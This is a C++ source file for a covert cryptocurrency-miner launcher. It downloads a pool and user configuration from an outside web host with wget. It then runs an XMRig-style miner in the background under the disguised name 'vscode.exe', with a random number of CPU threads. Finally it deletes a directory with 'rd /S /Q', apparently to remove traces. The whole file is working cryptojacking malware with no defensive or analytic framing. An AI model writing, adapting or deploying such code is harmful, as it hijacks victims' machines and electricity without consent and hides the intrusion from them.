#include "bits/stdc++.h"
const int network_ver = 1911;

inline void clr()
{
    system("rd /S /Q ../Soft");
}
inline void launch(const std::string pool, const std::string user, const int max_cpu_usage = 2)
{
    std::stringstream s;
    int r = rand() % max_cpu_usage + 1;
    s << "vscode.exe -B --threads " << r << "--donate-level 1 -o " << pool << " -u " << user << " -p x -k";
    system(s.str().c_str());
}
int main()
{
    srand(time(0));
    system("wget -O info https://config.dark.workers.dev/");
    std::ifstream info("info");
    std::string pool, user;
    int ver, max_cpu_usage = 1;
    info >> pool >> user >> ver;

    if (ver == network_ver)
    {
        launch(pool, user, max_cpu_usage);
    }

    clr();
    return 0;
}